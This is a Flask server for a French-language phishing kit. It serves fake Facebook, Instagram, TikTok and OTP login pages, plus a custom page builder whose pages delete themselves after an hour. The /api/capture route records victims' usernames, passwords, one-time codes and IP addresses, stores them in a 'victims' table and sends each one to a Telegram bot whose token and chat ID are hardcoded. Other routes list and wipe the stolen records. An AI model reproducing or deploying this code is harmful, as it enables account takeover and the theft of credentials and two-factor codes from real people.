import os
from flask import Flask, request, jsonify, render_template
import requests
import datetime
import sqlite3
import json

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "6141755021")
DB_NAME = 'abeilles.db'

PLATFORM_LOGOS = {
    "Facebook": "📘 [Facebook]",
    "Facebook OTP": "🔒 [Facebook OTP]",
    "Instagram": "📸 [Instagram]",
    "Instagram OTP": "🔐 [Instagram OTP]",
    "TikTok": "🎵 [TikTok]",
    "Portail Abeilles": "🐝 [Abeilles]"
}

def get_db_connection():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            network TEXT,
            type TEXT,
            victimUser TEXT,
            victimPass TEXT,
            victimOtp TEXT,
            dateStr TEXT,
            timestamp INTEGER,
            ip TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            slug TEXT UNIQUE,
            title TEXT,
            network TEXT,
            bg_type TEXT,
            bg_value TEXT,
            logo_url TEXT,
            logo_shape TEXT,
            fields_json TEXT,
            btn_text TEXT,
            created_at INTEGER
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Fonction de nettoyage automatique des liens No-Code après 1 heure
def cleanup_expired_custom_pages():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        one_hour_ago = int((datetime.datetime.now().timestamp() - 3600) * 1000)
        cursor.execute("DELETE FROM custom_pages WHERE created_at < ?", (one_hour_ago,))
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur nettoyage liens:", e)

def send_telegram_notification(message):
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "VOTRE_BOT_TOKEN":
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Erreur Telegram:", e)

@app.route('/')
def index():
    cleanup_expired_custom_pages()
    return render_template('index.html')

# --- ROUTAGE ULTRA-ROBUSTE AVEC 4 MÉTHODES DE SECOURS POUR STANDARD ET OTP ---
@app.route('/phish/<path:subpath>')
def render_phish_page(subpath):
    cleanup_expired_custom_pages()
    subpath_clean = subpath.lower().strip('/')
    req_type = request.args.get('type', 'standard').lower()
    
    # 1. Vérifier si c'est une page No-Code personnalisée
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM custom_pages WHERE slug = ?", (subpath_clean,))
    cp = cursor.fetchone()
    conn.close()

    if cp:
        config = {
            "title": cp["title"],
            "network": cp["network"],
            "bg_type": cp["bg_type"],
            "bg_value": cp["bg_value"],
            "logo_url": cp["logo_url"],
            "logo_shape": cp["logo_shape"],
            "fields": json.loads(cp["fields_json"]),
            "btn_text": cp["btn_text"]
        }
        return render_template('custom_login.html', config=config)

    # 2. Stratégie multi-méthodes pour cibler rigoureusement le bon dossier (standard/ ou otp/)
    possible_templates = []
    
    if req_type == 'otp' or 'otp' in subpath_clean:
        base_name = subpath_clean.replace('_otp', '').replace('-otp', '')
        possible_templates = [
            f"otp/{subpath_clean}.html",
            f"otp/{base_name}_otp.html",
            f"otp/{base_name}-otp.html",
            f"otp/facebook_otp.html" if "facebook" in base_name else f"otp/{base_name}.html"
        ]
    else:
        base_name = subpath_clean.replace('_otp', '').replace('-otp', '')
        possible_templates = [
            f"standard/{subpath_clean}.html",
            f"standard/{base_name}.html",
            f"standard/facebook.html" if "facebook" in base_name else f"standard/{base_name}.html"
        ]

    # Application séquentielle des 4 méthodes de secours pour garantir 100% de réussite
    for template_path in possible_templates:
        try:
            return render_template(template_path)
        except Exception:
            continue

    return f"Page de phishing introuvable pour : {subpath}", 404

@app.route('/api/create_login', methods=['POST'])
def create_login():
    data = request.json
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        cursor.execute('''
            INSERT OR REPLACE INTO custom_pages (slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data.get('slug'), data.get('title'), data.get('network'),
            data.get('bgType'), data.get('bgValue'), data.get('logoUrl'),
            data.get('logoShape'), json.dumps(data.get('fields')), data.get('btnText'), now_ts
        ))
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# Route API pour vider les victimes d'un utilisateur lors du changement de mot de passe
@app.route('/api/clear_victims', methods=['POST'])
def clear_victims():
    data = request.json
    owner = data.get('owner', '').strip()
    if not owner:
        return jsonify({"status": "error", "message": "Propriétaire non spécifié"})
    
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM victims WHERE owner = ?", (owner,))
        conn.commit()
        conn.close()
        return jsonify({"status": "success", "message": "Toutes les victimes ont été supprimées."})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/capture', methods=['POST'])
def capture_data():
    data = request.json
    owner = data.get('owner', 'Kim').strip()
    network = data.get('network', 'Facebook')
    v_user = data.get('victimUser')
    v_pass = data.get('victimPass')
    v_otp = data.get('otp', 'Aucun')
    v_type = data.get('type', 'standard')
    v_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    current_time = datetime.datetime.now()
    timestamp = int(current_time.timestamp() * 1000)
    date_str = current_time.strftime("%d/%m/%Y %H:%M:%S")

    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip))
    conn.commit()
    conn.close()

    platform_brand = PLATFORM_LOGOS.get(network, f"🌐 [{network}]")

    alert_text = (
        f"🚨 *NOUVELLE VICTIME CAPTURÉE* 🚨\n\n"
        f"{platform_brand}\n"
        f"👤 *Propriétaire:* `{owner}`\n"
        f"📋 *Flux:* `{v_type.upper()}`\n"
        f"🎯 *Identifiant:* `{v_user}`\n"
        f"🔑 *Mot de passe:* `{v_pass}`\n"
        f"🔒 *Code OTP:* `{v_otp}`\n"
        f"🕒 *Heure:* `{date_str}`\n"
        f"📍 *IP:* `{v_ip}`"
    )
    send_telegram_notification(alert_text)

    return jsonify({"status": "success", "message": "Captured and saved successfully"})

@app.route('/api/victims', methods=['GET'])
def get_victims():
    owner = request.args.get('owner', '').strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if owner and owner.upper() != 'INCONNU':
        cursor.execute("SELECT * FROM victims WHERE owner LIKE ? ORDER BY id DESC", (f"%{owner}%",))
    else:
        cursor.execute("SELECT * FROM victims ORDER BY id DESC")
        
    rows = cursor.fetchall()
    conn.close()
    
    victims_list = []
    for row in rows:
        victims_list.append({
            "id": row["id"],
            "owner": row["owner"],
            "network": row["network"],
            "type": row["type"],
            "victimUser": row["victimUser"],
            "victimPass": row["victimPass"],
            "otp": row["victimOtp"],
            "dateStr": row["dateStr"],
            "ip": row["ip"]
        })
    return jsonify(victims_list)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
